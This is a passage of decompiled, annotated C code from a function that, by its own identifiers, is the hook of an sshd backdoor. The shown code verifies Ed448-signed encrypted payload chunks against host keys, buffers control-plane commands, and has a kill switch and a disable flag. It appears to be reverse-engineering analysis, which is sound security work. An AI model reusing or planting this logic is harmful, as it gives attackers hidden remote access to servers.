                          // AutoDoc: Bit0 doubles as a kill switch: on fatal parse/signature errors the hook calls libc exit(0) instead of handing control back to OpenSSL.
                          (*exit_fn)(0);
                          return FALSE;
                        }
                        goto LAB_0010a11a;
                      }
                      // AutoDoc: Continuation chunks land here: copy the decrypted bytes into ctx->payload_buffer, extend payload_bytes_buffered, and re-verify the Ed448 signature before treating the chunk as another control-plane payload.
                      if (ed448_raw_key != (byte *)0x0) {
                        if ((encrypted_payload_bytes[1] & 1) == 0) {
                          loop_idx = 0;
                        }
                        else {
                          loop_idx = 8;
                          if (payload_body_len < 9) goto LAB_0010a112;
                        }
                        if (((loop_idx + 2U <= payload_body_len) &&
                            (payload_chunk_len = (ulong)*(ushort *)(encrypted_payload_bytes + payload_data_offset + loop_idx + 5) +
                                      loop_idx + 2U, payload_chunk_len < payload_body_len)) &&
                           (0x71 < payload_body_len - payload_chunk_len)) {
                          if (((ctx->payload_bytes_buffered <= ctx->payload_buffer_size) &&
                              (payload_segment_len = ctx->payload_buffer_size - ctx->payload_bytes_buffered,
                              0x38 < payload_segment_len)) && (payload_chunk_len <= payload_segment_len - 0x39)) {
                            payload_buffer_cursor = ctx->payload_buffer;
                            payload_segment_len = 0;
                            do {
                              payload_buffer_cursor[payload_segment_len] = encrypted_payload_bytes[payload_segment_len + payload_data_offset + 5];
                              payload_segment_len = payload_segment_len + 1;
                            } while (payload_chunk_len != payload_segment_len);
                            host_keys = ctx->sshd_sensitive_data->host_pubkeys;
                            sshkey_digest_offset = ctx->payload_bytes_buffered + payload_chunk_len;
                            ctx->payload_bytes_buffered = sshkey_digest_offset;
                            operation_ok = verify_signature(host_keys[ctx->sshd_host_pubkey_idx],
                                                      ctx->payload_buffer,sshkey_digest_offset,
                                                      ctx->payload_buffer_size,
                                                      auStack_2d9 + payload_chunk_len + payload_data_offset + -2,
                                                      ed448_raw_key,ctx);
                            if (operation_ok != FALSE) goto LAB_00109a97;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
LAB_0010a112:
      ctx->disable_backdoor = TRUE;
      goto LAB_0010a11a;
    }
    ctx->disable_backdoor = TRUE;
  }
  if (do_orig == (BOOL *)0x0) {
    return FALSE;
  }
LAB_0010a11a:
  *do_orig = TRUE;
  return FALSE;
}

